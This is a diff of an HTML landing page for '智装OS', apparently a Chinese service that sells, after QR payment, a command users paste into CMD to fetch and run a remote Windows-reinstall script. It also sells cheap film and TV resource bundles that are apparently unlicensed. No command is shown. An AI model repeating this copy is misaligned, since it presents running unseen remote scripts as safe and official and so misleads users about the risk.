@@ -40,385 +40,486 @@
 
 <div class="toast" id="toast" role="alert" aria-live="polite"></div>
 
-<!-- ==================== 导航栏 ==================== -->
-<header>
+<!-- ==================== 顶部导航栏 ==================== -->
+<header class="header">
     <nav class="navbar" role="navigation" aria-label="主导航">
         <div class="container">
-            <div class="logo"><span class="logo-icon" aria-hidden="true">⚡</span><span class="logo-text">智装OS</span></div>
-            <ul class="nav-links">
-                <li><a href="#features">服务特点</a></li>
-                <li><a href="#pricing">系统定价</a></li>
-                <li><a href="#how">安装流程</a></li>
-                <li><a href="#faq">常见问题</a></li>
+            <div class="logo">
+                <span class="logo-icon">⚡</span>
+                <span class="logo-text">智装OS</span>
+            </div>
+            <ul class="nav-menu">
+                <li><a href="#hero" class="nav-link">首页</a></li>
+                <li><a href="#services" class="nav-link">服务产品</a></li>
+                <li><a href="#features" class="nav-link">核心优势</a></li>
+                <li><a href="#guide" class="nav-link">使用指南</a></li>
+                <li><a href="#faq" class="nav-link">常见问题</a></li>
             </ul>
-            <button class="nav-cta" onclick="document.getElementById('pricing').scrollIntoView({behavior:'smooth'})">立即装机</button>
+            <button class="nav-cta" onclick="document.getElementById('services').scrollIntoView({behavior:'smooth'})">
+                立即开始
+            </button>
         </div>
     </nav>
 </header>
 
-<!-- ==================== Hero ==================== -->
 <main>
-    <section class="hero" aria-labelledby="hero-title">
+    <!-- ==================== Hero 英雄区 ==================== -->
+    <section id="hero" class="hero-section">
         <div class="container">
-            <div>
-                <div class="badge">🤖 AI 24小时全自动服务</div>
-                <h1 id="hero-title">告别繁琐<br>一键装机</h1>
-                <p class="hero-sub">
-                    无需U盘，无需技术基础<br>
-                    CMD命令行全自动重装，AI 全程护航
+            <div class="hero-content">
+                <div class="hero-badge">🤖 AI 24小时全自动服务</div>
+                <h1 class="hero-title">
+                    告别繁琐<br>
+                    <span class="gradient-text">一键装机</span>
+                </h1>
+                <p class="hero-subtitle">
+                    无需U盘 · CMD命令全自动安装<br>
+                    无需技术 · AI全程一键成功护航
                 </p>
+                
                 <div class="hero-stats">
-                    <div class="stat"><span class="stat-number">0</span><span class="stat-label">人工干预</span></div>
-                    <div class="stat"><span class="stat-number">24H</span><span class="stat-label">全天候服务</span></div>
-                    <div class="stat"><span class="stat-number">100%</span><span class="stat-label">自动完成</span></div>
+                    <div class="stat-item">
+                        <div class="stat-value">0</div>
+                        <div class="stat-label">人工干预</div>
+                    </div>
+                    <div class="stat-divider"></div>
+                    <div class="stat-item">
+                        <div class="stat-value">24H</div>
+                        <div class="stat-label">全天候服务</div>
+                    </div>
+                    <div class="stat-divider"></div>
+                    <div class="stat-item">
+                        <div class="stat-value">100%</div>
+                        <div class="stat-label">自动完成</div>
+                    </div>
                 </div>
-                <button class="primary-btn" onclick="document.getElementById('pricing').scrollIntoView({behavior:'smooth'})">
-                    选择系统版本 →
-                </button>
+                
+                <div class="hero-actions">
+                    <button class="btn-primary" onclick="document.getElementById('services').scrollIntoView({behavior:'smooth'})">
+                        选择服务 →
+                    </button>
+                </div>
             </div>
-            <div class="hero-visual" aria-hidden="true">
-                <div class="hero-visual-wrapper">
-                    <div class="hero-side-buttons">
-                        <div class="button-group">
-                            <p class="button-desc">海量影视，一键获取</p>
-                            <button class="quick-link-btn media-btn" onclick="document.getElementById('media').scrollIntoView({behavior:'smooth'})">
-                                🎬 影视资源网盘基地
-                            </button>
+            
+            <div class="hero-visual">
+                <div class="quick-access-cards">
+                    <div class="quick-card media-card" onclick="document.getElementById('media').scrollIntoView({behavior:'smooth'})">
+                        <div class="quick-card-icon">🎬</div>
+                        <div class="quick-card-content">
+                            <h3>影视资源网盘基地</h3>
+                            <p>海量影视，一键获取</p>
                         </div>
-                        <div class="button-group">
-                            <p class="button-desc">创业项目，助力成功</p>
-                            <button class="quick-link-btn startup-btn" onclick="document.getElementById('startup').scrollIntoView({behavior:'smooth'})">
-                                💼 网络创业项目基地
-                            </button>
+                        <div class="quick-card-arrow">→</div>
+                    </div>
+                    <div class="quick-card startup-card" onclick="document.getElementById('startup').scrollIntoView({behavior:'smooth'})">
+                        <div class="quick-card-icon">💼</div>
+                        <div class="quick-card-content">
+                            <h3>网络创业项目基地</h3>
+                            <p>创业项目，助力成功</p>
                         </div>
+                        <div class="quick-card-arrow">→</div>
                     </div>
                 </div>
             </div>
         </div>
     </section>
 
-<!-- ==================== 服务特点 ==================== -->
-<section id="features" class="section">
-    <div class="container">
-        <div class="section-header">
-            <h2>为什么选择智装OS？</h2>
-            <p>传统装机 vs AI 智能装机，降维打击</p>
-        </div>
-        <div class="features-grid">
-            <div class="feature-card">
-                <div class="feature-icon">🚫</div>
-                <h3>无需U盘</h3>
-                <p>不用买U盘、不用刻录引导盘。CMD 命令直接拉取安装脚本，一条命令搞定。</p>
+    <!-- ==================== 服务产品区 ==================== -->
+    <section id="services" class="services-section">
+        <div class="container">
+            <div class="section-header">
+                <h2 class="section-title">服务产品</h2>
+                <p class="section-subtitle">多元化服务，满足您的不同需求</p>
             </div>
-            <div class="feature-card">
-                <div class="feature-icon">🤖</div>
-                <h3>AI 全自动</h3>
-                <p>从下单到命令交付，从环境检测到系统安装，全程 AI 自动完成，零人工。</p>
-            </div>
-            <div class="feature-card">
-                <div class="feature-icon">⚡</div>
-                <h3>一条命令</h3>
-                <p>复制 → 粘贴 → 回车。安装脚本自动下载、自动执行、自动完成，你只需要等着。</p>
-            </div>
-            <div class="feature-card">
-                <div class="feature-icon">💰</div>
-                <h3>一杯奶茶钱</h3>
-                <p>Win7仅 ¥5，Win11 也才 ¥18.0。无隐藏费用，支付后立即获取命令和教程。</p>
-            </div>
-            <div class="feature-card">
-                <div class="feature-icon">📦</div>
-                <h3>命令 + 教程</h3>
-                <p>支付成功后立即下发专属安装命令 + 图文教程，零基础也能装。</p>
-            </div>
-            <div class="feature-card">
-                <div class="feature-icon">🛡️</div>
-                <h3>安全纯净</h3>
-                <p>系统镜像官方原版，无捆绑、无后门、无全家桶。干净得像刚出厂。</p>
-            </div>
-        </div>
-    </div>
-</section>
-
-<!-- ==================== 定价 ==================== -->
-<section id="pricing" class="section" style="background:rgba(0,0,0,0.2)">
-    <div class="container">
-        <div class="section-header">
-            <h2>选择系统版本</h2>
-            <p>透明定价，支付后即刻获取安装命令</p>
-        </div>
-        <div class="pricing-grid">
-            <div class="pricing-card win7" onclick="openPay('Windows 7','5','win7')">
-                <div class="pricing-tag">经典怀旧</div>
-                <div class="pricing-icon">💻</div>
-                <h3>Windows 7</h3>
-                <p class="pricing-desc">经典稳定，兼容性强</p>
-                <div class="price"><span class="currency">¥</span><span class="amount">5</span></div>
-                <ul class="feat-list">
-                    <li>✓ 官方原版镜像</li>
-                    <li>✓ 专属安装命令</li>
-                    <li>✓ 图文安装教程</li>
-                    <li>✓ 永久使用授权</li>
-                </ul>
-                <button class="buy-btn">立即购买</button>
-            </div>
-            <div class="pricing-card win8" onclick="openPay('Windows 8','11','win8')">
-                <div class="pricing-tag">稳定之选</div>
-                <div class="pricing-icon">🖥️</div>
-                <h3>Windows 8</h3>
-                <p class="pricing-desc">现代界面，触控优化</p>
-                <div class="price"><span class="currency">¥</span><span class="amount">11</span></div>
-                <ul class="feat-list">
-                    <li>✓ 官方原版镜像</li>
-                    <li>✓ 专属安装命令</li>
-                    <li>✓ 图文安装教程</li>
-                    <li>✓ 永久使用授权</li>
-                </ul>
-                <button class="buy-btn">立即购买</button>
-            </div>
-            <div class="pricing-card win10 popular" onclick="openPay('Windows 10','15','win10')">
-                <div class="popular-tag">🔥 最受欢迎</div>
-                <div class="pricing-icon">🖥️</div>
-                <h3>Windows 10</h3>
-                <p class="pricing-desc">主流系统，性能均衡</p>
-                <div class="price"><span class="currency">¥</span><span class="amount">15</span></div>
-                <ul class="feat-list">
-                    <li>✓ 官方原版镜像</li>
-                    <li>✓ 专属安装命令</li>
-                    <li>✓ 图文安装教程</li>
-                    <li>✓ 优先技术支持</li>
-                </ul>
-                <button class="buy-btn">立即购买</button>
-            </div>
-            <div class="pricing-card win11" onclick="openPay('Windows 11','18.0','win11')">
-                <div class="pricing-tag">最新旗舰</div>
-                <div class="pricing-icon">🚀</div>
-                <h3>Windows 11</h3>
-                <p class="pricing-desc">全新体验，前沿科技</p>
-                <div class="price"><span class="currency">¥</span><span class="amount">18.0</span></div>
-                <ul class="feat-list">
-                    <li>✓ 官方原版镜像</li>
-                    <li>✓ 专属安装命令</li>
-                    <li>✓ 图文安装教程</li>
-                    <li>✓ 专属技术支持</li>
-                </ul>
-                <button class="buy-btn">立即购买</button>
-            </div>
-        </div>
-    </div>
-</section>
-
-<!-- ==================== 影视资源网盘基地 ==================== -->
-<section id="media" class="section">
-    <div class="container">
-        <div class="section-header">
-            <h2>影视资源网盘基地</h2>
-            <p>海量影视资源，一键获取</p>
-        </div>
-        <div class="media-grid">
-            <div class="media-card foreign popular" onclick="openPay('国外影视剧','2','media-foreign')">
-                <div class="popular-tag">🔥 最受欢迎</div>
-                <div class="media-icon">🎥</div>
-                <h3>国外影视剧</h3>
-                <p class="media-desc">美剧、韩剧、日剧等</p>
-                <div class="price"><span class="currency">¥</span><span class="amount">2</span></div>
-                <ul class="feat-list">
-                    <li>✓ 海量资源库</li>
-                    <li>✓ 中文字幕</li>
-                    <li>✓ 高清画质</li>
-                    <li>✓ 永久访问权限</li>
-                </ul>
-                <button class="buy-btn">立即购买</button>
-            </div>
-            <div class="media-card domestic" onclick="openPay('国内影视剧','2','media-domestic')">
-                <div class="media-tag">热门推荐</div>
-                <div class="media-icon">🎬</div>
-                <h3>国内影视剧</h3>
-                <p class="media-desc">国产剧、综艺、纪录片</p>
-                <div class="price"><span class="currency">¥</span><span class="amount">2</span></div>
-                <ul class="feat-list">
-                    <li>✓ 海量资源库</li>
-                    <li>✓ 持续更新</li>
-                    <li>✓ 高清画质</li>
-                    <li>✓ 永久访问权限</li>
-                </ul>
-                <button class="buy-btn">立即购买</button>
-            </div>
-            <div class="media-card short" onclick="openPay('短剧漫剧AI剧','2','media-short')">
-                <div class="media-tag">新兴潮流</div>
-                <div class="media-icon">📱</div>
-                <h3>短剧漫剧AI剧</h3>
-                <p class="media-desc">短视频剧、AI生成剧</p>
-                <div class="price"><span class="currency">¥</span><span class="amount">2</span></div>
-                <ul class="feat-list">
-                    <li>✓ 精选内容</li>
-                    <li>✓ 快速更新</li>
-                    <li>✓ 多种格式</li>
-                    <li>✓ 永久访问权限</li>
-                </ul>
-                <button class="buy-btn">立即购买</button>
-            </div>
-        </div>
-    </div>
-</section>
-
-<!-- ==================== 网络创业项目基地 ==================== -->
-<section id="startup" class="section">
-    <div class="container">
-        <div class="section-header">
-            <h2>网络创业项目基地</h2>
-            <p>精选创业项目,助力成功之路</p>
-        </div>
-        <div class="startup-grid">
-            <div class="startup-card project popular" onclick="openPay('网创项目','1','startup-project')">
-                <div class="popular-tag">🔥 热门推荐</div>
-                <div class="startup-icon">💼</div>
-                <h3>网创项目</h3>
-                <p class="startup-desc">网络创业项目合集</p>
-                <div class="price"><span class="currency">¥</span><span class="amount">1</span></div>
-                <ul class="feat-list">
-                    <li>✓ 精选优质项目</li>
-                    <li>✓ 详细操作教程</li>
-                    <li>✓ 持续更新资源</li>
-                    <li>✓ 永久访问权限</li>
-                </ul>
-                <button class="buy-btn">立即购买</button>
-            </div>
-            <div class="startup-card service" onclick="openPay('生活服务','1','startup-service')">
-                <div class="startup-tag">实用工具</div>
-                <div class="startup-icon">🛠️</div>
-                <h3>生活服务</h3>
-                <p class="startup-desc">生活服务资源合集</p>
-                <div class="price"><span class="currency">¥</span><span class="amount">1</span></div>
-                <ul class="feat-list">
-                    <li>✓ 实用服务资源</li>
-                    <li>✓ 便捷使用指南</li>
-                    <li>✓ 持续更新内容</li>
-                    <li>✓ 永久访问权限</li>
-                </ul>
-                <button class="buy-btn">立即购买</button>
-            </div>
-        </div>
-    </div>
-</section>
-
-<!-- ==================== 安装流程 ==================== -->
-<section id="how" class="section">
-    <div class="container">
-        <div class="section-header">
-            <h2>三步搞定</h2>
-            <p>比泡面还简单</p>
-        </div>
-        <div class="steps-grid">
-            <div class="step-card">
-                <div class="step-num">1</div>
-                <h3>选择 → 支付</h3>
-                <p>选系统版本，扫码支付。支持支付宝、微信。</p>
-            </div>
-            <div class="step-card">
-                <div class="step-num">2</div>
-                <h3>复制命令 → 粘贴执行</h3>
-                <p>支付成功后获得专属命令，打开 CMD 粘贴回车，全自动跑。</p>
-            </div>
-            <div class="step-card">
-                <div class="step-num">3</div>
-                <h3>等它装完</h3>
-                <p>去泡杯咖啡，回来系统就好了。全程无需任何操作。</p>
-            </div>
-        </div>
-    </div>
-</section>
-
-<!-- ==================== FAQ ==================== -->
-<section id="faq" class="section" style="background:rgba(0,0,0,0.2)">
-    <div class="container">
-        <div class="section-header">
-            <h2>常见问题</h2>
-            <p>有疑问？看这里</p>
-        </div>
-        <div class="faq-list">
-            <div class="faq-item">
-                <div class="faq-q" onclick="toggleFaq(this)">
-                    <span>不需要U盘真的能装系统吗？</span>
-                    <span class="icon">+</span>
+            
+            <!-- 系统安装服务 -->
+            <div id="pricing" class="service-category">
+                <div class="category-header">
+                    <div class="category-icon">💻</div>
+                    <h3>系统安装服务</h3>
+                    <p>官方原版镜像，安全纯净无捆绑</p>
                 </div>
-                <div class="faq-a"><div class="faq-a-inner">
-                    完全可以！我们使用 CMD 命令直接远程拉取安装脚本到你的电脑，脚本会自动下载系统镜像并执行安装。整个过程不需要任何物理介质，只要电脑能上网就行。
-                </div></div>
-            </div>
-            <div class="faq-item">
-                <div class="faq-q" onclick="toggleFaq(this)">
-                    <span>支付后多久能拿到命令？</span>
-                    <span class="icon">+</span>
+                <div class="service-grid">
+                    <div class="service-card win7-card" onclick="openPay('Windows 7','5','win7')">
+                        <div class="service-badge">经典怀旧</div>
+                        <div class="service-icon">💻</div>
+                        <h4>Windows 7</h4>
+                        <p class="service-desc">经典稳定，兼容性强</p>
+                        <div class="service-price">
+                            <span class="price-currency">¥</span>
+                            <span class="price-value">5</span>
+                        </div>
+                        <ul class="service-features">
+                            <li>✓ 官方原版镜像</li>
+                            <li>✓ 专属安装命令</li>
+                            <li>✓ 图文安装教程</li>
+                            <li>✓ 永久使用授权</li>
+                        </ul>
+                        <button class="btn-buy">立即购买</button>
+                    </div>
+                    
+                    <div class="service-card win8-card" onclick="openPay('Windows 8','11','win8')">
+                        <div class="service-badge">稳定之选</div>
+                        <div class="service-icon">🖥️</div>
+                        <h4>Windows 8</h4>
+                        <p class="service-desc">现代界面，触控优化</p>
+                        <div class="service-price">
+                            <span class="price-currency">¥</span>
+                            <span class="price-value">11</span>
+                        </div>
+                        <ul class="service-features">
+                            <li>✓ 官方原版镜像</li>
+                            <li>✓ 专属安装命令</li>
+                            <li>✓ 图文安装教程</li>
+                            <li>✓ 永久使用授权</li>
+                        </ul>
+                        <button class="btn-buy">立即购买</button>
+                    </div>
+                    
+                    <div class="service-card win10-card popular" onclick="openPay('Windows 10','15','win10')">
+                        <div class="popular-badge">🔥 最受欢迎</div>
+                        <div class="service-icon">🖥️</div>
+                        <h4>Windows 10</h4>
+                        <p class="service-desc">主流系统，性能均衡</p>
+                        <div class="service-price">
+                            <span class="price-currency">¥</span>
+                            <span class="price-value">15</span>
+                        </div>
+                        <ul class="service-features">
+                            <li>✓ 官方原版镜像</li>
+                            <li>✓ 专属安装命令</li>
+                            <li>✓ 图文安装教程</li>
+                            <li>✓ 优先技术支持</li>
+                        </ul>
+                        <button class="btn-buy">立即购买</button>
+                    </div>
+                    
+                    <div class="service-card win11-card" onclick="openPay('Windows 11','18.0','win11')">
+                        <div class="service-badge">最新旗舰</div>
+                        <div class="service-icon">🚀</div>
+                        <h4>Windows 11</h4>
+                        <p class="service-desc">全新体验，前沿科技</p>
+                        <div class="service-price">
+                            <span class="price-currency">¥</span>
+                            <span class="price-value">18.0</span>
+                        </div>
+                        <ul class="service-features">
+                            <li>✓ 官方原版镜像</li>
+                            <li>✓ 专属安装命令</li>
+                            <li>✓ 图文安装教程</li>
+                            <li>✓ 专属技术支持</li>
+                        </ul>
+                        <button class="btn-buy">立即购买</button>
+                    </div>
                 </div>
-                <div class="faq-a"><div class="faq-a-inner">
-                    支付成功后系统自动核验（通常几秒内），核验通过后立即展示你的专属安装命令和图文教程，无需等待。
-                </div></div>
             </div>
-            <div class="faq-item">
-                <div class="faq-q" onclick="toggleFaq(this)">
-                    <span>安装过程会丢数据吗？</span>
-                    <span class="icon">+</span>
+            
+            <!-- 影视资源服务 -->
+            <div id="media" class="service-category">
+                <div class="category-header">
+                    <div class="category-icon">🎬</div>
+                    <h3>影视资源网盘基地</h3>
+                    <p>海量影视资源，一键获取</p>
                 </div>
-                <div class="faq-a"><div class="faq-a-inner">
-                    重装系统会格式化 C 盘（系统盘），C 盘上的数据会丢失。D 盘等其他分区的数据通常不受影响。请在安装前备份重要文件。
-                </div></div>
+                <div class="service-grid">
+                    <div class="service-card media-foreign-card popular" onclick="openPay('国外影视剧','2','media-foreign')">
+                        <div class="popular-badge">🔥 最受欢迎</div>
+                        <div class="service-icon">🎥</div>
+                        <h4>国外影视剧</h4>
+                        <p class="service-desc">美剧、韩剧、日剧等</p>
+                        <div class="service-price">
+                            <span class="price-currency">¥</span>
+                            <span class="price-value">2</span>
+                        </div>
+                        <ul class="service-features">
+                            <li>✓ 海量资源库</li>
+                            <li>✓ 中文字幕</li>
+                            <li>✓ 高清画质</li>
+                            <li>✓ 永久访问权限</li>
+                        </ul>
+                        <button class="btn-buy">立即购买</button>
+                    </div>
+                    
+                    <div class="service-card media-domestic-card" onclick="openPay('国内影视剧','2','media-domestic')">
+                        <div class="service-badge">热门推荐</div>
+                        <div class="service-icon">🎬</div>
+                        <h4>国内影视剧</h4>
+                        <p class="service-desc">国产剧、综艺、纪录片</p>
+                        <div class="service-price">
+                            <span class="price-currency">¥</span>
+                            <span class="price-value">2</span>
+                        </div>
+                        <ul class="service-features">
+                            <li>✓ 海量资源库</li>
+                            <li>✓ 持续更新</li>
+                            <li>✓ 高清画质</li>
+                            <li>✓ 永久访问权限</li>
+                        </ul>
+                        <button class="btn-buy">立即购买</button>
+                    </div>
+                    
+                    <div class="service-card media-short-card" onclick="openPay('短剧漫剧AI剧','2','media-short')">
+                        <div class="service-badge">新兴潮流</div>
+                        <div class="service-icon">📱</div>
+                        <h4>短剧漫剧AI剧</h4>
+                        <p class="service-desc">短视频剧、AI生成剧</p>
+                        <div class="service-price">
+                            <span class="price-currency">¥</span>
+                            <span class="price-value">2</span>
+                        </div>
+                        <ul class="service-features">
+                            <li>✓ 精选内容</li>
+                            <li>✓ 快速更新</li>
+                            <li>✓ 多种格式</li>
+                            <li>✓ 永久访问权限</li>
+                        </ul>
+                        <button class="btn-buy">立即购买</button>
+                    </div>
+                </div>
             </div>
-            <div class="faq-item">
-                <div class="faq-q" onclick="toggleFaq(this)">
-                    <span>安装失败了怎么办？</span>
-                    <span class="icon">+</span>
+            
+            <!-- 网络创业项目 -->
+            <div id="startup" class="service-category">
+                <div class="category-header">
+                    <div class="category-icon">💼</div>
+                    <h3>网络创业项目基地</h3>
+                    <p>精选创业项目，助力成功之路</p>
                 </div>
-                <div class="faq-a"><div class="faq-a-inner">
-                    先检查网络是否稳定、磁盘空间是否充足（至少 20GB）。如果问题依旧，联系在线客服，我们会帮你远程排查。
-                </div></div>
-            </div>
-            <div class="faq-item">
-                <div class="faq-q" onclick="toggleFaq(this)">
-                    <span>系统是正版吗？</span>
-                    <span class="icon">+</span>
+                <div class="service-grid two-columns">
+                    <div class="service-card startup-project-card popular" onclick="openPay('网创项目','1','startup-project')">
+                        <div class="popular-badge">🔥 热门推荐</div>
+                        <div class="service-icon">💼</div>
+                        <h4>网创项目</h4>
+                        <p class="service-desc">网络创业项目合集</p>
+                        <div class="service-price">
+                            <span class="price-currency">¥</span>
+                            <span class="price-value">1</span>
+                        </div>
+                        <ul class="service-features">
+                            <li>✓ 精选优质项目</li>
+                            <li>✓ 详细操作教程</li>
+                            <li>✓ 持续更新资源</li>
+                            <li>✓ 永久访问权限</li>
+                        </ul>
+                        <button class="btn-buy">立即购买</button>
+                    </div>
+                    
+                    <div class="service-card startup-service-card" onclick="openPay('生活服务','1','startup-service')">
+                        <div class="service-badge">实用工具</div>
+                        <div class="service-icon">🛠️</div>
+                        <h4>生活服务</h4>
+                        <p class="service-desc">生活服务资源合集</p>
+                        <div class="service-price">
+                            <span class="price-currency">¥</span>
+                            <span class="price-value">1</span>
+                        </div>
+                        <ul class="service-features">
+                            <li>✓ 实用服务资源</li>
+                            <li>✓ 便捷使用指南</li>
+                            <li>✓ 持续更新内容</li>
+                            <li>✓ 永久访问权限</li>
+                        </ul>
+                        <button class="btn-buy">立即购买</button>
+                    </div>
                 </div>
-                <div class="faq-a"><div class="faq-a-inner">
-                    提供的是微软官方原版镜像，纯净无捆绑。你支付的是技术服务费（命令生成、教程、售后支持）。如需正版激活密钥，需另行购买。
-                </div></div>
             </div>
         </div>
-    </div>
-</section>
+    </section>
 
-<!-- ==================== Footer ==================== -->
+    <!-- ==================== 核心优势 ==================== -->
+    <section id="features" class="features-section">
+        <div class="container">
+            <div class="section-header">
+                <h2 class="section-title">为什么选择智装OS？</h2>
+                <p class="section-subtitle">传统装机 vs AI智能装机，降维打击</p>
+            </div>
+            
+            <div class="features-grid">
+                <div class="feature-card">
+                    <div class="feature-icon">🚫</div>
+                    <h3>无需U盘</h3>
+                    <p>不用买U盘、不用刻录引导盘。CMD命令直接拉取安装脚本，一条命令搞定。</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">🤖</div>
+                    <h3>AI全自动</h3>
+                    <p>从下单到命令交付，从环境检测到系统安装，全程AI自动完成，零人工。</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">⚡</div>
+                    <h3>一条命令</h3>
+                    <p>复制 → 粘贴 → 回车。安装脚本自动下载、自动执行、自动完成，你只需要等着。</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">💰</div>
+                    <h3>一杯奶茶钱</h3>
+                    <p>Win7仅¥5，Win11也才¥18.0。无隐藏费用，支付后立即获取命令和教程。</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">📦</div>
+                    <h3>命令+教程</h3>
+                    <p>支付成功后立即下发专属安装命令+图文教程，零基础也能装。</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">🛡️</div>
+                    <h3>安全纯净</h3>
+                    <p>系统镜像官方原版，无捆绑、无后门、无全家桶。干净得像刚出厂。</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ==================== 使用指南 ==================== -->
+    <section id="guide" class="guide-section">
+        <div class="container">
+            <div class="section-header">
+                <h2 class="section-title">三步搞定</h2>
+                <p class="section-subtitle">比泡面还简单</p>
+            </div>
+            
+            <div class="steps-container">
+                <div class="step-card">
+                    <div class="step-number">1</div>
+                    <div class="step-content">
+                        <h3>选择 → 支付</h3>
+                        <p>选系统版本，扫码支付。支持支付宝、微信。</p>
+                    </div>
+                </div>
+                <div class="step-connector"></div>
+                <div class="step-card">
+                    <div class="step-number">2</div>
+                    <div class="step-content">
+                        <h3>复制命令 → 粘贴执行</h3>
+                        <p>支付成功后获得专属命令，打开CMD粘贴回车，全自动跑。</p>
+                    </div>
+                </div>
+                <div class="step-connector"></div>
+                <div class="step-card">
+                    <div class="step-number">3</div>
+                    <div class="step-content">
+                        <h3>等它装完</h3>
+                        <p>去泡杯咖啡，回来系统就好了。全程无需任何操作。</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ==================== 常见问题 ==================== -->
+    <section id="faq" class="faq-section">
+        <div class="container">
+            <div class="section-header">
+                <h2 class="section-title">常见问题</h2>
+                <p class="section-subtitle">有疑问？看这里</p>
+            </div>
+            
+            <div class="faq-container">
+                <div class="faq-item">
+                    <div class="faq-question" onclick="toggleFaq(this)">
+                        <span>不需要U盘真的能装系统吗？</span>
+                        <span class="faq-icon">+</span>
+                    </div>
+                    <div class="faq-answer">
+                        <div class="faq-answer-content">
+                            完全可以！我们使用CMD命令直接远程拉取安装脚本到你的电脑，脚本会自动下载系统镜像并执行安装。整个过程不需要任何物理介质，只要电脑能上网就行。
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="faq-item">
+                    <div class="faq-question" onclick="toggleFaq(this)">
+                        <span>支付后多久能拿到命令？</span>
+                        <span class="faq-icon">+</span>
+                    </div>
+                    <div class="faq-answer">
+                        <div class="faq-answer-content">
+                            支付成功后系统自动核验（通常几秒内），核验通过后立即展示你的专属安装命令和图文教程，无需等待。
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="faq-item">
+                    <div class="faq-question" onclick="toggleFaq(this)">
+                        <span>安装过程会丢数据吗？</span>
+                        <span class="faq-icon">+</span>
+                    </div>
+                    <div class="faq-answer">
+                        <div class="faq-answer-content">
+                            重装系统会格式化C盘（系统盘），C盘上的数据会丢失。D盘等其他分区的数据通常不受影响。请在安装前备份重要文件。
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="faq-item">
+                    <div class="faq-question" onclick="toggleFaq(this)">
+                        <span>安装失败了怎么办？</span>
+                        <span class="faq-icon">+</span>
+                    </div>
+                    <div class="faq-answer">
+                        <div class="faq-answer-content">
+                            先检查网络是否稳定、磁盘空间是否充足（至少20GB）。如果问题依旧，联系在线客服，我们会帮你远程排查。
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="faq-item">
+                    <div class="faq-question" onclick="toggleFaq(this)">
+                        <span>系统是正版吗？</span>
+                        <span class="faq-icon">+</span>
+                    </div>
+                    <div class="faq-answer">
+                        <div class="faq-answer-content">
+                            提供的是微软官方原版镜像，纯净无捆绑。你支付的是技术服务费（命令生成、教程、售后支持）。如需正版激活密钥，需另行购买。
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
 </main>
-<footer class="footer" role="contentinfo">
+
+<!-- ==================== 页脚 ==================== -->
+<footer class="footer">
     <div class="container">
-        <div class="footer-grid">
+        <div class="footer-content">
             <div class="footer-brand">
-                <div class="logo"><span class="logo-icon" aria-hidden="true">⚡</span><span class="logo-text">智装OS</span></div>
-                <p>AI 全自动装机平台<br>让装机变得像扫码一样简单</p>
+                <div class="logo">
+                    <span class="logo-icon">⚡</span>
+                    <span class="logo-text">智装OS</span>
+                </div>
+                <p>AI全自动装机平台<br>让装机变得像扫码一样简单</p>
             </div>
-            <div class="footer-col">
-                <h4>服务</h4>
-                <nav aria-label="服务导航">
-                    <a href="#pricing">系统下载</a>
-                    <a href="#how">安装流程</a>
-                    <a href="#faq">常见问题</a>
-                </nav>
-            </div>
-            <div class="footer-col">
-                <h4>支持</h4>
-                <nav aria-label="支持导航">
-                    <a href="javascript:void(0)" onclick="showContact()">联系客服</a>
-                    <a href="#">使用条款</a>
-                    <a href="#">隐私政策</a>
-                </nav>
-            </div>
-            <div class="footer-col">
-                <h4>关于</h4>
-                <nav aria-label="关于导航">
-                    <a href="javascript:void(0)" onclick="showAbout()">关于我们</a>
-                    <a href="#">服务协议</a>
-                    <a href="#">退款政策</a>
-                </nav>
+            
+            <div class="footer-links">
+                <div class="footer-column">
+                    <h4>服务</h4>
+                    <nav>
+                        <a href="#pricing">系统下载</a>
+                        <a href="#guide">安装流程</a>
+                        <a href="#faq">常见问题</a>
+                    </nav>
+                </div>
+                
+                <div class="footer-column">
+                    <h4>支持</h4>
+                    <nav>
+                        <a href="javascript:void(0)" onclick="showContact()">联系客服</a>
+                        <a href="#">使用条款</a>
+                        <a href="#">隐私政策</a>
+                    </nav>
+                </div>
+                
+                <div class="footer-column">
+                    <h4>关于</h4>
+                    <nav>
+                        <a href="javascript:void(0)" onclick="showAbout()">关于我们</a>
+                        <a href="#">服务协议</a>
+                        <a href="#">退款政策</a>
+                    </nav>
+                </div>
             </div>
         </div>
+        
         <div class="footer-bottom">
             <p>&copy; 2026 智装OS. All rights reserved. | 本站仅提供技术服务，系统版权归微软公司所有</p>
         </div>
@@ -426,75 +527,77 @@
 </footer>
 
 <!-- ==================== 支付弹窗 ==================== -->
-<div class="modal-mask" id="payModal">
-    <div class="modal">
-        <div class="modal-head">
+<div class="modal-overlay" id="payModal">
+    <div class="modal-container">
+        <div class="modal-header">
             <h3>💳 扫码支付</h3>
             <button class="modal-close" onclick="closePay()">&times;</button>
         </div>
         <div class="modal-body">
             <!-- 订单信息 -->
-            <div class="order-row">
-                <span class="label">系统版本</span>
-                <span class="value" id="payOS">-</span>
-            </div>
-            <div class="order-row">
-                <span class="label">订单金额</span>
-                <span class="value price-val" id="payPrice">¥0</span>
-            </div>
-            <div class="order-row">
-                <span class="label">订单号</span>
-                <span class="value" id="payOrderNo" style="font-family:monospace;font-size:12px;color:var(--text-muted)">-</span>
+            <div class="order-info">
+                <div class="order-row">
+                    <span class="order-label">系统版本</span>
+                    <span class="order-value" id="payOS">-</span>
+                </div>
+                <div class="order-row">
+                    <span class="order-label">订单金额</span>
+                    <span class="order-value order-price" id="payPrice">¥0</span>
+                </div>
+                <div class="order-row">
+                    <span class="order-label">订单号</span>
+                    <span class="order-value order-no" id="payOrderNo">-</span>
+                </div>
             </div>
 
             <!-- 支付方式切换 -->
-            <div class="pay-tabs">
-                <button class="pay-tab active" onclick="switchPay('alipay')">
+            <div class="payment-tabs">
+                <button class="payment-tab active" onclick="switchPay('alipay')">
                     <span>💳</span> 支付宝
                 </button>
-                <button class="pay-tab" onclick="switchPay('wechat')">
+                <button class="payment-tab" onclick="switchPay('wechat')">
                     <span>📱</span> 微信支付
                 </button>
             </div>
 
             <!-- 支付宝 -->
-            <div class="pay-panel active" id="panelAlipay">
-                <div class="qr-box">
